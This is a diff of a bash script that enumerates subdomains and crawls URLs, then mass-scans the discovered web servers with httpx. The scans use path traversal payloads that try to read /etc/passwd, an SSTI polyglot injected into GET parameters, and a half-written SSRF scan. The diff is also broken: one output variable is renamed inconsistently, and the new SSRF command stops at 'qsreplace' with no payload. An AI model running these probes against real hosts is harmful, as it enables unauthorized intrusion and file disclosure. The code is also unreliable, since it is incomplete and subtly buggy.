@@ -22,6 +22,7 @@ scan_uri_openredir=$name".all.scan_uri_openredir"
 scan_reflected_xss=$name".all.scan_reflected_xss"
 scan_get_param_openredir=$name".all.scan_get_param_openredir"
 scan_ssti=$name".all.scan_ssti"
+scan_get_ssrf=$name".all.scan_get_ssrf"
 
 subfinder -dL $roots -all -o $subfinder_path;
 cat $subfinder_path | puredns resolve --write $resolved_path;
@@ -57,7 +58,7 @@ cat $webservers_path | httpx -timeout 30 -vhost -o $vhost_path;
 
 if [ $scan = scan ]; then
     # performing path traversal scans
-    cat $webservers_path | httpx -timeout 30 -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' -o $scan_traversal_1;
+    cat $webservers_path | httpx -timeout 30 -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' -o $traversal_scan_1;
     cat $webservers_path | httpx -timeout 30 -path "/../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' -o $scan_traversal_2;
 
     # performing uri based open redirect scan
@@ -71,6 +72,9 @@ if [ $scan = scan ]; then
     #cat $katana_path $gau_path | sort -u | grep "?" | qsreplace 'https://example.com' | httpx -timeout 30 -mc 301,302,303,308 -mr 'example.com' -o $scan_get_param_openredir;
     
     cat $katana_path $gau_path | sort -u | grep "?" | qsreplace '<%= 5252 *  111%>@(5252*111)${{5252*111}}{{5252*111}}' | httpx -timeout 30 -mc 200 -mr '582972' -o $scan_ssti;
+
+    # scan get based ssrf
+    cat $katana_path $gau_path | sort -u | grep "?" | qsreplace 
 fi
 
 #todo:
